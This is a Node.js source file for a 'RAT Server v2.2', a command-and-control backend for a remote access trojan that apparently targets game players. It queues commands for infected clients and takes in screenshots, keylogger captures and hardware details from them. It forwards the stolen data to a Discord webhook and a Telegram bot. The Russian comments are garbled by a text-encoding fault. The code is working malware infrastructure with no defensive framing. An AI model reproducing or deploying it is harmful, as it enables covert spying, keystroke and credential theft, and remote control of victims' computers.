// server.js - –û–±–Ω–æ–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö –≤ –ø–∞–º—è—Ç–∏
let serverData = {
    lastCommand: "",
    lastArgs: [],
    lastScreenshot: null,
    connectedClients: 0
};

// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
const WEBHOOK_URL = process.env.WEBHOOK_URL || "";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
    }
}

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
function logAction(action, details) {
    const timestamp = new Date().toLocaleString('ru-RU');
    const logMessage = `[${timestamp}] ${action}: ${details}`;
    console.log(logMessage);
    
    // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤–∞–∂–Ω—ã—Ö —Å–æ–±—ã—Ç–∏–π –≤ Telegram
    if (action.includes('–ò–ù–ñ–ï–ö–¢') || action.includes('–ö–ï–ô–õ–û–ì–ì–ï–†')) {
        sendToTelegram(`<b>${action}</b>\n<code>${details}</code>\n<pre>${timestamp}</pre>`);
    }
}

// –ú–∞—Ä—à—Ä—É—Ç—ã API

// –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞
app.get('/', (req, res) => {
    res.json({ 
        status: 'RAT Server v2.2', 
        online: true,
        clients: serverData.connectedClients,
        timestamp: new Date().toISOString()
    });
});

// –ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –∫–ª–∏–µ–Ω—Ç–æ–º
app.get('/data', (req, res) => {
    const response = {
        command: serverData.lastCommand,
        args: serverData.lastArgs,
        timestamp: new Date().toISOString()
    };
    
    // –°–±—Ä–∞—Å—ã–≤–∞–µ–º –∫–æ–º–∞–Ω–¥—É –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
    serverData.lastCommand = "";
    serverData.lastArgs = [];
    
    res.json(response);
});

// –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥ –Ω–∞ –∫–ª–∏–µ–Ω—Ç
app.post('/command', (req, res) => {
    try {
        const { command, args } = req.body;
        
        if (!command) {
            return res.status(400).json({ error: "No command provided" });
        }
        
        logAction('–ö–û–ú–ê–ù–î–ê', `${command} ${args ? args.join(' ') : ''}`);
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∫–ª–∏–µ–Ω—Ç–∞
        serverData.lastCommand = command;
        serverData.lastArgs = args || [];
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö –∫–æ–º–∞–Ω–¥
        if (command === "user_chat" || command === "inject_notify" || command === "execute_log") {
            if (WEBHOOK_URL) {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**${args[0]}:** ${args[1]}`
                    })
                }).catch(console.error);
            }
            
            sendToTelegram(`<b>${args[0]}:</b> ${args[1]}`);
        }
        
        res.json({ status: "OK", command: command });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤
app.post('/screenshot', (req, res) => {
    try {
        const { image } = req.body;
        
        if (!image) {
            return res.status(400).json({ error: "No image data" });
        }
        
        serverData.lastScreenshot = image;
        logAction('–°–ö–†–ò–ù–®–û–¢', '–ü–æ–ª—É—á–µ–Ω –Ω–æ–≤—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç');
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
        if (image.length < 1000) { // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑–º–µ—Ä–∞
            sendToTelegram(`<b>–°–ö–†–ò–ù–®–û–¢:</b>\n<code>${image.substring(0, 500)}...</code>`);
        }
        
        res.json({ status: "Screenshot received" });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
app.get('/screenshot', (req, res) => {
    if (serverData.lastScreenshot) {
        res.json({ image: serverData.lastScreenshot });
        serverData.lastScreenshot = null;
    } else {
        res.status(404).json({ error: "No screenshot available" });
    }
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –ª–æ–≥–æ–≤ –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞
app.post('/keylog', (req, res) => {
    try {
        const { logs } = req.body;
        
        if (!logs) {
            return res.status(400).json({ error: "No logs data" });
        }
        
        logAction('–ö–ï–ô–õ–û–ì–ì–ï–†', `–ü–æ–ª—É—á–µ–Ω–æ ${logs.length} —Å–∏–º–≤–æ–ª–æ–≤`);
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Discord
        if (WEBHOOK_URL) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**Keylogger Data:**\n\`\`\`\n${logs.substring(0, 1900)}\n\`\`\``
                })
            }).catch(console.error);
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
        if (logs.length > 0) {
            sendToTelegram(`<b>–ö–ï–ô–õ–û–ì–ì–ï–† –î–ê–ù–ù–´–ï:</b>\n<pre>${logs.substring(0, 1000)}</pre>`);
        }
        
        res.json({ status: "Logs received" });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –æ–±–æ—Ä—É–¥–æ–≤–∞–Ω–∏–∏
app.post('/hardware', (req, res) => {
    try {
        const { player, data } = req.body;
        
        logAction('–û–ë–û–†–£–î–û–í–ê–ù–ò–ï', `–î–∞–Ω–Ω—ã–µ –æ—Ç ${player}`);
        
        const hwInfo = `–ò–≥—Ä–æ–∫: ${player}
FPS: ${data.fps}
Ping: ${data.ping}
Executor: ${data.executor}
${data.cpu ? `CPU: ${data.cpu}` : ''}
${data.ram ? `RAM: ${data.ram}` : ''}`;

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –∫–∞–Ω–∞–ª—ã
        if (WEBHOOK_URL) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**Hardware Info:**\n\`\`\`\n${hwInfo}\n\`\`\``
                })
            }).catch(console.error);
        }

        sendToTelegram(`<b>–ò–ù–§–û –û–ë–û–†–£–î–û–í–ê–ù–ò–Ø:</b>\n<pre>${hwInfo}</pre>`);
        
        res.json({ status: "Hardware data received" });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// –°—Ç–∞—Ç—É—Å —Å–µ—Ä–≤–µ—Ä–∞
app.get('/status', (req, res) => {
    res.json({ 
        status: "online", 
        version: "2.2",
        timestamp: new Date().toISOString(),
        lastCommand: serverData.lastCommand,
        connectedClients: serverData.connectedClients
    });
});

// –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
app.listen(PORT, () => {
    console.log(`üöÄ RAT Server v2.2 –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
    console.log(`üì° URL: ${process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`}`);
    
    // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ
    sendToTelegram(`<b>üü¢ RAT –°–ï–†–í–ï–† –ó–ê–ü–£–©–ï–ù</b>\n–ü–æ—Ä—Ç: ${PORT}\n–í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`);
});

module.exports = app;
